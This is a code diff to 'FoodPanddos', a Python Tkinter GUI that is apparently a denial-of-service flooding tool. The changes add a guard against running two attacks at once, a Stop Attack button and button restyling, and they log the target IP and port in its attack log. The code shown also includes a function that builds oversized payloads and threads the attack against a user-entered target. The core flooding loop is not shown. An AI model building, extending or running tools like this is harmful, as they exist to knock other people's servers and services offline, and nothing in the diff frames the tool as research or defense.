@@ -30,12 +30,6 @@ window.resizable(False, False)
 title_frame = tk.Frame(window)
 title_frame.pack(pady=10)
 
-# Loading the image
-icon_image = tk.PhotoImage(file="D:/foodpanda.png")
-
-# Setting the icon
-window.iconphoto(True, icon_image)
-
 # Creating a title label
 title_label = tk.Label(title_frame, text="FoodPanddos", font=("Arial", 16, "bold"))
 title_label.pack()
@@ -55,7 +49,7 @@ def authenticate(password):
 def login():
     password = password_entry.get()
     if authenticate(password):
-        window.geometry("650x635")  # Change window geometry
+        window.geometry("650x690")  # Change window geometry
         login_frame.pack_forget()  # Hide the login frame
         controls_frame.pack()  # Show the attack controls frame
         info_frame.pack()  # Show the attack info frame
@@ -111,7 +105,15 @@ def generate_severe_payload(payload_type):
     payload = bytearray(payload_type, "utf-8") * 1024
     return payload
 
+attack_in_progress = False
+
 def start_attack():
+    global attack_in_progress
+
+    if attack_in_progress:
+        print("Attack is already in progress.")
+        return
+
     target = target_entry.get()
     # Extracting the IP address from the input
     try:
@@ -126,6 +128,10 @@ def start_attack():
     except ConnectionRefusedError:
         print("Connection refused. Target is not available.")
         return
+
+    attack_in_progress = True
+    start_button.config(state=tk.DISABLED)
+    stop_button.config(state=tk.NORMAL)
 
     # Function to launch the attack
     def attack():
@@ -173,19 +179,32 @@ def start_attack():
         packets_per_second_label.config(text="Packets per Second: " + str(packets_per_second))
 
         # Update log file
-        update_log_file(total_packets_sent, attack_duration, packets_per_second, payload_type)
+        update_log_file(total_packets_sent, attack_duration, packets_per_second, payload_type, ip, target_port)
+
+        # Reset attack status
+        attack_in_progress = False
+        start_button.config(state=tk.NORMAL)
+        stop_button.config(state=tk.DISABLED)
 
     # Create and start a thread for the attack
     attack_thread = threading.Thread(target=attack)
     attack_thread.start()
 
-def update_log_file(total_packets_sent, attack_duration, packets_per_second, payload_type):
+def stop_attack():
+    global attack_in_progress
+    attack_in_progress = False
+    start_button.config(state=tk.NORMAL)
+    stop_button.config(state=tk.DISABLED)
+
+def update_log_file(total_packets_sent, attack_duration, packets_per_second, payload_type, target_ip, target_port):
     log_filename = "FoodPanddos Logs.txt"
     log_dir = os.path.dirname(os.path.abspath(__file__))
     log_path = os.path.join(log_dir, log_filename)
 
     current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     log_entry = f"Date/Time: {current_time}\n"
+    log_entry += f"Target IP: {target_ip}\n"
+    log_entry += f"Target Port: {target_port}\n"
     log_entry += f"Attack type: {payload_type}\n"
     log_entry += f"Packets Sent: {total_packets_sent}\n"
     log_entry += f"Attack Duration: {attack_duration} seconds\n"
@@ -225,8 +244,13 @@ payload_menu = tk.OptionMenu(controls_frame, payload_dropdown, *payload_options)
 payload_menu.pack(pady=5)
 
 # Creating a start button to initiate the attack
-start_button = tk.Button(controls_frame, text="Start Attack", command=start_attack, font=("Arial", 12), bg="red", fg="white", padx=10, pady=5)
+start_button = tk.Button(controls_frame, text="Start Attack", command=start_attack, font=("Arial", 12), bg="AliceBlue", fg="AntiqueWhite4", padx=10, pady=5)
 start_button.pack()
+
+# Creating a stop button to stop the attack
+stop_button = tk.Button(controls_frame, text="Stop Attack", command=stop_attack, font=("Arial", 12), bg="AliceBlue", fg="AntiqueWhite4", padx=10, pady=5)
+stop_button.pack()
+stop_button.config(state=tk.DISABLED)
 
 controls_frame.pack(pady=10)
 
